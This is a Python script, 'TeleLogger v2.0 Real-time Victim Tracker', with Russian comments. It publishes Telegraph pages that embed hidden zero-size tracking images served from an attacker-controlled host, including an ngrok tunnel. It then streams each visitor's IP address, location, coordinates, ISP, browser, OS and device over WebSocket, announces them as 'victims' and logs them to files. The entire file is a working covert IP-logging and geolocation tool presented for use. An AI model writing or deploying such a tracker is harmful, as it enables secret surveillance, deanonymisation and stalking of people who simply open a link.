#!/usr/bin/env python3
import asyncio
import websockets
import json
from telegraph import Telegraph
from datetime import datetime
import os

class TeleLogger:
    def __init__(self, express_url="ws://localhost:3000"):
        self.express_url = express_url
        self.telegraph = Telegraph()
        self.telegraph.create_account(short_name='TeleLogger')
        
    def create_telegraph_page(self, title, description, image_url):
        """Создает страницу Telegraph с вредоносным изображением"""
        
        content = f"""
        <p><b>{title}</b></p>
        <p>{description}</p>
        <p><img src="{image_url}" style="display:none" width="1" height="1" /></p>
        <p><img src="{image_url}" width="0" height="0" /></p>
        <p>Loading content...</p>
        """
        
        response = self.telegraph.create_page(
            title=title,
            html_content=content,
            author_name="TeleLogger"
        )
        
        return response['url']
    
    async def connect_to_express(self):
        """Подключается к Express серверу через WebSocket и получает данные в реальном времени"""
        try:
            async with websockets.connect(self.express_url) as websocket:
                print(f"\n[+] Connected to Express server at {self.express_url}")
                print("[+] Waiting for victims...\n")
                print("-" * 60)
                
                async for message in websocket:
                    data = json.loads(message)
                    self.display_victim(data)
                    
        except ConnectionRefusedError:
            print(f"\n[-] Cannot connect to {self.express_url}")
            print("[-] Make sure Express server is running: node server.js")
        except Exception as e:
            print(f"\n[-] Error: {e}")
    
    def display_victim(self, data):
        """Отображает данные о жертве в консоли"""
        
        print("\n" + "█" * 60)
        print("█  NEW VICTIM DETECTED")
        print("█" * 60)
        print(f"█  IP Address:     {data.get('ip')}")
        print(f"█  Location:       {data.get('city')}, {data.get('country')}")
        print(f"█  ISP:            {data.get('isp')}")
        print(f"█  Coordinates:    {data.get('lat')}, {data.get('lon')}")
        print("█" + "-" * 58 + "█")
        print(f"█  Website:        {data.get('website')}")
        print(f"█  Referer:        {data.get('referer')[:50]}..." if len(data.get('referer', '')) > 50 else f"█  Referer:        {data.get('referer')}")
        print("█" + "-" * 58 + "█")
        print(f"█  Browser:        {data.get('browser')}")
        print(f"█  OS:             {data.get('os')}")
        print(f"█  Device:         {data.get('device')}")
        print(f"█  User-Agent:     {data.get('userAgent', '')[:60]}...")
        print("█" + "-" * 58 + "█")
        print(f"█  Time:           {data.get('timestamp')}")
        print("█" * 60)
        
        # Сохраняем в файл
        with open('victims.log', 'a') as f:
            f.write(f"[{data.get('timestamp')}] {data.get('ip')} | {data.get('country')} | {data.get('website')}\n")
        
        # Сохраняем полные данные в JSON
        with open('victims_full.json', 'a') as f:
            f.write(json.dumps(data, indent=2) + '\n')
    
    def run(self, title, description, image_url):
        print("\n[+] Creating Telegraph page...")
        page_url = self.create_telegraph_page(title, description, image_url)
        print(f"[+] Page created: {page_url}")
        print(f"[+] Malicious image: {image_url}")
        print(f"[+] Tracking server: {self.express_url}")
        
        # Запускаем WebSocket прослушивание
        asyncio.run(self.connect_to_express())

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║         TeleLogger v2.0               ║
    ║    Real-time Victim Tracker           ║
    ╚═══════════════════════════════════════╝
    """)
    
    title = input("[?] Enter page title: ")
    description = input("[?] Enter page description: ")
    
    # Используем ваш локальный сервер
    print("\n[!] Варианты URL для изображения:")
    print("    1. http://localhost:3000/track.jpg (локальный тест)")
    print("    2. http://YOUR_IP:3000/track.jpg (локальная сеть)")
    print("    3. https://YOUR_NGROK.ngrok.io/track.jpg (интернет)")
    
    image_url = input("[?] Enter malicious image URL: ")
    
    if not image_url:
        image_url = "http://localhost:3000/track.jpg"
    
    # WebSocket URL (обычно тот же хост, порт 3000)
    ws_url = image_url.replace("http://", "ws://").replace("https://", "wss://").replace("/track.jpg", "")
    
    logger = TeleLogger(express_url=ws_url)
    logger.run(title, description, image_url)